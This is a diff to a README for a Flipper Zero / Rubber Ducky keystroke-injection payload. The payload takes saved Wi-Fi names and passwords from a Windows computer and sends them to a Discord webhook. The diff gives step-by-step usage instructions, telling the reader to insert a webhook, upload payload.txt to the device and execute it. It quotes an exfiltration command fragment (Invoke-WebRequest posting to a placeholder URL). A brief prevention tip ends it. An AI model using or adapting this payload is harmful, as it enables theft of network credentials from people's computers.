@@ -14,12 +14,12 @@ Obtain Wi-Fi names and passwords from a Microsoft Windows operating system compu
 > The payload was designed for a Flipper Zero using the classic Rubber Ducky Scripting Language 1.0 to exfiltrate data through the use of Discord webhooks. It can also be used as a regular payload with a webhook.
 
 # 📄 Instructions
-1. Replace "https://YOUR_LINK_HERE.com" with your custom webhook and save the file.
+1. Replace "https://YOUR_LINK_HERE.com" in [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) with your custom webhook.
 
 `...Invoke-WebRequest -Uri https://YOUR_LINK_HERE.com -Method Post...`
 
-2. Upload the [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) to your device.
-3. All done, execute the file and check the response.
+2. Upload [payload.txt](https://github.com/cxdzc/network-payload/payload.txt) to your device.
+3. Execute the file.
 
 # ⛔ Prevention
 There are many ways to prevent this hotload attack from occurring. A very quick, simple, and temporary way is by deleting "Managed Known Networks" in Settings and to refrain from saving your Wi-Fi passwords.
